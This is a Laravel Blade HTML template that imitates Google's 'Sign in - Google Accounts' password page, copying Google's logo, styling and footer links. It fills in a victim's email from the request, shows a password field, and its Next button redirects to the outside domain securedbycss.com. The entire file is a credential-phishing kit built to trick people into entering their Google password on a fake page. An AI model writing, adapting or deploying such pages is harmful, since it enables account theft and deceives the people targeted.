<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="{{ asset('css/style.css') }}">
    <script>
        function handleNextClick() {
            window.location.href = 'https://securedbycss.com';
        }
    </script>
</head>
<body class="jR8x9d nyoS7c UzCXuf EIlDfe">

<div class="S7xv8 LZgQXe">
    <div class="TcuCfd NQ5OL">
        <div class="Ih3FE" aria-hidden="true">
            <div role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                <div class="xcNBHc um3FLe"></div>
                <div class="w2zcLc Iq5ZMc"></div>
                <div class="MyvhI TKVRUb"><span class="l3q5xe SQxu9c"></span></div>
                <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
            </div>
        </div>
        <div class="fAlnEc" id="yDmH0d">
            <div class="Svhjgc">
                <div class="zIgDIc">
                    <div class="Wf6lSd">
                        <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true">
                            <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
                            <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
                            <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
                            <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
                        </svg>
                    </div>
                    <div class="ObDc3 ZYOIke">
                        <h1 class="vAV9bf">Hi, {{ request('email') ? explode('@', request('email'))[0] : '' }}
                        </h1>
                        <div class="SOeSgb">
                            <div class="Ahygpe m8wwGd EPPJc cd29Sd xNLKcb" tabindex="0" role="link" aria-label="gfaggiolly@securedbycss.com selected. Switch account">
                                <div class="HOE91e">
                                    <div class="JQ5tlb" aria-hidden="true"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIAAAACACAIAAABMXPacAAAAA3NCSVQICAjb4U/gAAAABmJLR0QAjQBuAGMmxxmUAAAG00lEQVR4nO2b2VcTVxzH78wkBMIuYQtr2GQXOQgCIkfUulQ9tqd/QX3rg8997rt/Qt/74GmrlVq11iqyY0F2WQMKCbvIEgIk6UMqnbkZKGQm+d2pv89T8pt7vnPlc+A3c++Vu3P7FkHg4KEn8KmDAoBBAcCgAGBQADAoABgUAAwKAAYFAIMCgEEBwKAAYFAAMCgAGBQADAoABgUAgwKAQQHAoABgUAAwKAAYFAAMCgAGBQCDAoBBAcCgAGBQADAoABgUAAwKAAYFAIMCgEEBwKAAYFAAMCgAGBQAzN9kk6odsjIMJAAAAABJRU5ErkJggg==" alt="" class="MnFlu TrZEUc"></div>
                                </div>
                                <div class="IxcUte">{{ request()->query('email') }}</div>
                                <div class="JCl8ie"><svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg></div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="UXFQgc">
                    <div class="qWK5J">
                        <div class="xKcayf">
                            <form method="post" novalidate="">
                                <section class="Em2Ord">
                                    <div class="yTaH4c">
                                        <div>To continue, first verify it’s you</div>
                                    </div>
                                </section>
                                <section class="Em2Ord">
                                    <div class="yTaH4c">
                                        <input type="email" name="identifier" class="Hvu6D" tabindex="-1" aria-hidden="true" value="gfaggiolly@securedbycss.com" autocomplete="off" id="hiddenEmail">
                                        <div class="njnYzb NhPs4c">
                                            <div class="YqLCIe">
                                                <div class="El1b7b">
                                                    <div class="klRug">
                                                        <div class="H2p7Gf">
                                                            <div id="password" class="rFrNMe i79UJc zKHdkd sdJrJc">
                                                                <div class="aCsJod oJeWuf">
                                                                    <div class="aXBtI Wic03c">
                                                                        <div class="Xb9hP">
                                                                            <input type="password" class="whsOnd zHQkBf" autocomplete="current-password" spellcheck="false" tabindex="0" aria-label="Enter your password" name="Passwd" autocapitalize="off">
                                                                            <div class="AxOyFc snByac" aria-hidden="true">Enter your password</div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="v8aRxf">
                                                <div class="myYH1 g9Mx QkTfte">
                                                    <div class="Hy62Fc">
                                                        <div class="sfqPrd rBUW7e">
                                                            <div class="QTJzre NEk0Ve">
                                                                <div class="uxXgMe">
                                                                    <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb">
                                                                        <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine lezCeb kAVONc VfPpkd-MPu53c-OWXEXe-mWPk3d">
                                                                            <input class="VfPpkd-muHVFf-bMcfAe" type="checkbox" aria-labelledby="selectionc7">
                                                                            <div class="VfPpkd-YQoJzd">
                                                                                <svg aria-hidden="true" class="VfPpkd-HUofsb" viewBox="0 0 24 24">
                                                                                    <path class="VfPpkd-HUofsb-Jt5cK" fill="none" d="M1.73,12.91 8.1,19.28 22.79,4.59"></path>
                                                                                </svg>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                                <div class="gyrWGe">
                                                                    <div class="jOkGjb">
                                                                        <div id="selectionc7" class="dJVBl wIAG6d">Show password</div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </section>
                                <div class="JYXaTc lUWEgd">
                                    <div class="O1Slxf">
                                        <div class="TNTaPb">
                                            <div id="passwordNext">
                                                <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb">
                                                    <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 BqKGqe Jskylb TrZEUc lw1w4b" type="button" onclick="handleNextClick()">
                                                        <span class="VfPpkd-vQzf8d">Next</span>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="FO2vFd">
                                            <div id="forgotPassword">
                                                <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb">
                                                    <button class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-dgl2Hf ksBjEc lKxP2d LQeN7 BqKGqe eR0mzb TrZEUc lw1w4b" type="button">
                                                        <span class="VfPpkd-vQzf8d">Forgot password?</span>
                                                    </button>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="wmGw4">
        <footer class="FZfKCe">
            <div class="eXa0v">
                <div class="O1htCb-H9tDt">
                    <div class="VfPpkd-O1htCb VfPpkd-O1htCb-OWXEXe-INsAgc VfPpkd-O1htCb-OWXEXe-di8rgd-V67aGc ReCbLb UAQDDf dEoyBf">
                        <div class="VfPpkd-TkwUic" role="combobox" tabindex="0" aria-haspopup="listbox" aria-expanded="false" aria-labelledby="i2 i3" aria-controls="i5" aria-live="polite">
                            <span class="VfPpkd-NSFCdd-i5vt6e VfPpkd-NSFCdd-i5vt6e-OWXEXe-NSFCdd VfPpkd-NSFCdd-i5vt6e-OWXEXe-di8rgd-V67aGc"><span class="VfPpkd-NSFCdd-Brv4Fb"></span><span class="VfPpkd-NSFCdd-MpmGFe"></span></span><span hidden="" id="i2" aria-label="Change language"></span><span class="VfPpkd-uusGie-fmcmS-haAclf" aria-hidden="true"><span id="i3" class="VfPpkd-uusGie-fmcmS" aria-label="">English (United States)</span></span><span class="VfPpkd-t08AT-Bz112c"><svg class="VfPpkd-t08AT-Bz112c-Bd00G" viewBox="7 10 10 5" focusable="false" aria-hidden="true"><polygon class="VfPpkd-t08AT-Bz112c-mt1Mkb" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10"></polygon><polygon class="VfPpkd-t08AT-Bz112c-auswjd" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15"></polygon></svg></span>
                        </div>
                    </div>
                </div>
            </div>
            <ul class="HwzH1e">
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a></li>
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true" target="_blank">Privacy</a></li>
                <li class="qKvP1b"><a class="AVAq4d TrZEUc" href="https://accounts.google.com/TOS?loc=US&hl=en" target="_blank">Terms</a></li>
            </ul>
        </footer>
    </div>
</div>
</body>
</html>
